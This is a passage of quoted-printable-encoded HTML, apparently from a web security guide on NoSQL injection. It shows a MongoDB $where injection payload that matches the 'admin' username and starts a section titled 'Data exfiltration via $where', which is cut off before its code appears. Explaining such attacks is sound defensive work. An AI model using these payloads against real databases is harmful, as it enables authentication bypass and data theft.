</span></span><span>{"$where": "this.username =3D=3D 'admin'"}</span></code=
></pre></div><div id=3D"data-exfiltration-via-dollarwhere"><h4>Data exfiltr=
ation via $where</h4><pre contenteditable=3D"false" class=3D"w-code-block" =
style=3D"display:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;pad=
ding:0.5em"><code class=3D"language-javascript" style=3D"white-space:pre-wr=
